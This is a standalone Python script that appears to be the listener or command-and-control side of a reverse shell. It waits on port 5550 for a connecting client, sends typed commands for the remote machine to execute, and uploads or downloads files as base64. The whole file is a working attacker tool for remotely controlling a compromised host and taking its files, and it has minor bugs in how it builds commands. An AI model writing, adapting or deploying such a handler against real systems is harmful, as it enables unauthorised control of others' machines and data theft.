from datetime import datetime
import json
import socket
import base64
from typing import List

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("0.0.0.0", 5550))
listener.listen(0)
print("[+] Waiting for incoming connections")
cl_socket, remote_address = listener.accept()
print(f"[+] Got a connection from {remote_address} ")

try:

    while True:
        command: str = input(">> ")

        if "upd" in command:
            _, path_server, path_client = command.split(' ')
            with open(path_server, 'rb') as file:
                data = file.read()
            data = base64.b64encode(data)

            command = "upd" + path_client + " " + str(len(data)) + " "
            cl_socket.send(command.encode() + data)
            response = cl_socket.recv(1024).decode()
            print(response)

        elif "dwd" in command:
            _, path_client, path_server = command.split(' ')
            command = "dwd " + path_client
            cl_socket.send(command.encode())
            response = cl_socket.recv(1024).decode()
            size, data = response.split(' ')

            while len(data) != int(size):
                data = data + cl_socket.recv(1024).decode()
            data = base64.b64decode(data)

            with open(path_server, "wb") as file:
                file.write(data)

            _, file = path_server.split("/")
            print(f"File {file} is downloaded")

        else:
            cl_socket.send(command.encode())
            response = cl_socket.recv(1024).decode()
            print(response)

except KeyboardInterrupt:
    listener.close()
    exit()